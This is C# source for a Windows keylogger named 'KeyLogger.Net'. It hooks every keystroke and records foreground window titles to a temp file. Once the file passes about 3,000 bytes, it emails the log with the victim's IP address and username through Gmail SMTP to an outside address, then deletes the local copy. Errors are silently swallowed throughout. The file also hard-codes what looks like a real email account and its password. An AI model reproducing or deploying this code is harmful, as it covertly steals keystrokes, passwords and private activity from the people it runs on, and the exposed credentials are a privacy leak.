using System;
using System.IO;
using System.Net;
using System.Text;
using System.Web;
using System.Net.Mail;
using System.Net.Mime;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;


namespace KeyLogger.Net
{

    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
             
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        public Form1()
        {
            InitializeComponent();
        }
        globalKeyboardHook gkh = new globalKeyboardHook();

        private void HookAll()
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }
        private string AdminNamerr = SystemInformation.UserName;
        private string WhyMyPath = Path.GetTempPath();

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
                HookAll();
            }
            catch (Exception)
            { }
        }
        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                StreamWriter SW = new StreamWriter(WhyMyPath + @"\" + AdminNamerr + ".txt", true);
                SW.Write("" + e.KeyCode);
                SW.Close();
            }
            catch (Exception)
            { }
        }
        private string fuck = "";
        int vklvikl = 1;
        int udalenie = 0;

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                int razraz = 1;
                if (razraz == 1)
                {
                    foreach (IPAddress ip in System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName()).AddressList)
                    {
                        fuck = ip.ToString();
                    }
                    razraz = 0;
                }
                else
                { }

                int pamyat = 3000;
                if (File.Exists(WhyMyPath + @"\" + AdminNamerr + ".txt"))
                {
                    FileInfo fl = new FileInfo(WhyMyPath + @"\" + AdminNamerr + ".txt");
                    long size = fl.Length;
                    if (size >= pamyat)
                    {
                        if (vklvikl == 1)
                        {

                            SmtpClient Smtp = new SmtpClient("smtp.gmail.com", 25);
                            Smtp.Credentials = new NetworkCredential("vladychenkoa@gmail.com", "vgunk5790848");


                            MailMessage Message = new MailMessage();
                            Message.From = new MailAddress("vladychenkoa@gmail.com");
                            Message.To.Add(new MailAddress("manekovskiy@gmail.com"));
                            Message.Subject = "KeyLogger.Net";
                            Message.Body = "Здравсвуйте!\n" + "KeyLogger.Net в дейсвии\n " + "\nIP:" + " " + fuck.ToString() + "\n Имя юзера:" + " " + AdminNamerr.ToString();


                            string file = (WhyMyPath + @"\" + AdminNamerr + ".txt");
                            Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);


                            ContentDisposition disposition = attach.ContentDisposition;
                            disposition.CreationDate = System.IO.File.GetCreationTime(file);
                            disposition.ModificationDate = System.IO.File.GetLastWriteTime(file);
                            disposition.ReadDate = System.IO.File.GetLastAccessTime(file);

                            Message.Attachments.Add(attach);

                            Smtp.Send(Message);
                            vklvikl = 0;
                            udalenie = 1;
                            timer3.Enabled = true;
                        }

                        else
                        { }

                    }
                    else
                    { }
                }
            }
            catch (Exception)
            { }
        }
        private string tuctuctuc = "";
        private string texxx = "";

        private void timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                int chars = 256;
                StringBuilder buff = new StringBuilder(chars);


                IntPtr handle = GetForegroundWindow();


                if (GetWindowText(handle, buff, chars) > 0)

                    tuctuctuc = buff.ToString();
                if (tuctuctuc.ToString() == texxx.ToString())
                {
                }
                else
                {

                    string otstuplenie = "                                            ";
                    StreamWriter SW = new StreamWriter(WhyMyPath + @"\" + AdminNamerr + ".txt", true);
                    SW.WriteLine("");
                    SW.WriteLine(otstuplenie + tuctuctuc.ToString() + ":");
                    SW.Close();
                }
                texxx = buff.ToString();

            }
            catch (Exception)
            { }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            try
            {
                if (udalenie == 1)
                {

                    File.Delete(WhyMyPath + @"\" + AdminNamerr + ".txt");
                    udalenie = 0;
                    vklvikl = 1;
                    timer3.Enabled = false;
                }
                else
                { }
            }
            catch (Exception)
            { }
        }
    }
}
